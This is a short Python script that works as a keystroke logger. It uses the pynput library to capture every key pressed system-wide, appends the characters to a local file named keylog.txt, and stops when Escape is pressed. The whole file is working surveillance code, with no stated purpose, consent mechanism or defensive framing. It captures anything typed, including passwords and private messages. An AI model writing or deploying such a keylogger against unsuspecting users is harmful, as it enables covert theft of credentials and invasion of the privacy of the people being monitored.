from pynput.keyboard import Key, Listener

# File to store keystrokes
log_file = "keylog.txt"

def on_press(key):
    # Open log file in append mode
    with open(log_file, "a") as f:
        try:
            f.write(str(key.char))
        except AttributeError:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            else:
                f.write(f'[{str(key)}]')

def on_release(key):
    # Stop listener on pressing escape key
    if key == Key.esc:
        return False

# Start listening to keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
